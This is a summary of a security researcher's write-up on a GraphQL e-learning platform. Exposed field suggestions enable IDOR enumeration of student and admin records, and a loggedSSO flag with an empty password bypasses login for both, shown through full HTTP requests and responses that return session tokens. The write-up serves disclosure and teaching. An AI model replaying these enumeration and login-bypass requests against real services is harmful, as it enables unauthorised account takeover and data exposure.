# The Butterfly Effect: Turning Overlooked Misconfigurations into Zero Click Account Takeover

- The report can be read [here](https://oussamarahali.com/blog/butterfly-effect-zero-click-account-takeover/)

- The researcher is [Oussama Rahali](https://x.com/ourahali)

- Date of report is: August 07, 2024

<br>
<br>

## Summary

- This report explains how a very simple, insignificant feature (from the devs' pov), was used for a much more significat, complete Admin takover.

- Presence of __`GraphQL Suggestions`__

<br>
<br>

## Details

- The researcher was tasked with pentesting a web application for e-learning platform. The web app was usiong GraphQL API for most of its purposes.

- Now the devs had left `GraphQL Suggestions` on by default in production. From a small perspective, it doesnt mean much, but It was the main piece of the puzzle that started everything.

- The researcher with the help of GraphQL Suggestions was able to get proper mutations required to query the underlying database for Student and Admin accounts.

- During this period, the `student id` and `admininstrator id` were found to be a supporter of IDOR.

<br>

#### Enumeration of Students:

- Request: 

```json
POST /graphql
Host: foo.target.com
Authorization: Bearer [Student JWT]
Content-Type: application/json

{
  "operationName": "student",
  "variables": {},
  "query": "query student {\n  student(id:1234) {\n    firstName\n    lastName\n    profile\n    affiliation\n    email\n    createdAt\n    __typename\n  }\n}"
}
```


- Response for student enumeration:

```json
HTTP/2 200 OK
[..]

{
  "data": {
    "student": {
      "firstName": "Alan",
      "lastName": "Turing",
      "profile": "Employee",
      "affiliation": "foobar",
      "email": "alan.turing@student.tld",
      "createdAt": "2021-05-18T17:58:21.000Z",
      "__typename": "Student"
    }
  }
}
```

<br>

#### Enumeration of Admins

- Request:

```json
POST /graphql
Host: foo.target.com
Authorization: Bearer [Student JWT]
Content-Type: application/json

{
  "operationName": "Administrator",
  "variables": {
    "id": "500"
  },
  "query": "query Administrator($id: ID!) {\n  administrator(id: $id) {\n    id\n    firstName\n    lastName\n    email\n    adminLevel\n    trainerId\n    affiliation\n    proprietaire\n    team\n    favoriteCourses\n     specificAccessStartDate\n    specificAccessEndDate\n    __typename\n  }\n}"
}
```

- Response:

```json
HTTP/2 200 OK
[..]

{
  "data": {
    "administrator": {
      "id": "500",
      "firstName": "Linus",
      "lastName": "Torvalds",
      "email": "linus.torvalds@admin.tld",
      "adminLevel": 2,
      "trainerId": "Linus_Torvalds",
      "affiliation": "",
      "proprietaire": null,
      "team": null,
      "favoriteCourses": null,
      "specificAccessStartDate": null,
      "specificAccessEndDate": null,
      "__typename": "Administrator"
    }
  }
}
```

<br>
<br>

## Next Steps

- While analyzing the JS files on the application, the researcher found mutation for __logging in  as `student`__:

![login-student](https://oussamarahali.com/assets/JS_file_snipped.png)

- just setting the `loggedSSO` value to `ture` without passing a __password__, researcher was able to bypass the autentication.

- This meant, with just email IDs (that we were able to collect via IDOR), you could login as any student.

<br>

#### bypass student login

- Request:

```json
POST /graphql
Host: foo.target.tld
Content-Type: application/json

{
  "operationName": "LoginStudent",
  "variables": {
    "email": "alan.turing@student.tld",
    "password": "",
    "loggedSSO": true
  },
  "query": "mutation LoginStudent($email: String, $uid: String, $password: String, $loggedSSO: Boolean!, $dataToUpdate: String) {\n  loginStudent(\n    email: $email\n    uid: $uid\n    password: $password\n    loggedSSO: $loggedSSO\n    dataToUpdate: $dataToUpdate\n  )\n}"
}
```

- Response:

```json
HTTP/2 200 OK
[..]

{
  "data": {
    "loginStudent": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzNCwiZW1haWwiOiJhbGFuLnR1cmluZ0BzdHVkZW50LnRsZCIsImFmZmlsaWF0aW9uIjoidGFyZ2V0IiwiaWF0IjoxNzIxMjI2OTIwLCJleHAiOjE3MjkwMDI5MjB9.rCRntgXZmuqeaAv_l0w5SvTGiXnpTS62qiboaq-o5sc"
  }
}
```

- With this token, we had access to any Student page.


<br>

### Authentication Bypass: Admin


- The researcher tried a sligthly modified mutation to login as Admin, he was wrong, but again, the GraphQL Suggestions came in handy:

![suggestion](https://oussamarahali.com/assets/graphql_suggestions.png)


- Crafted Mutation: `LoginAdmin`, Correct Mutation: `loginAdmin`

<br>

#### Admin bypass attempt

- Request:

```json
POST /graphql
Host: foo.target.tld
Content-Type: application/json

{
  "operationName": "loginAdmin",
  "variables": {
    "email": "linus.torvalds@admin.tld",
    "password": "",
    "loggedSSO": true
  },
  "query": "mutation loginAdmin($email: String, $uid: String, $password: String, $loggedSSO: Boolean!, $dataToUpdate: String) {\n  loginAdmin(\n    email: $email\n    uid: $uid\n    password: $password\n    loggedSSO: $loggedSSO\n    dataToUpdate: $dataToUpdate\n  )\n}"
}
```

- Response:

```json
HTTP/2 200 OK
[..]

{
  "data": {
    "loginAdmin": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTAwLCJlbWFpbCI6ImxpbnVzLnRvcnZhbGRzQGFkbWluLnRsZCIsImFkbWluTGV2ZWwiOjIsImlhdCI6MTcyMTMwMjMyNywiZXhwIjoxNzIzODk0MzI3fQ.xd-9Jf9OlBlWAc-H_DuU-WiK1dEj1UbYwCPnPWiT8Mk"
  }
}
```


- And this is how, simple GraphQL Suggestions lead to full Admin account takeover!
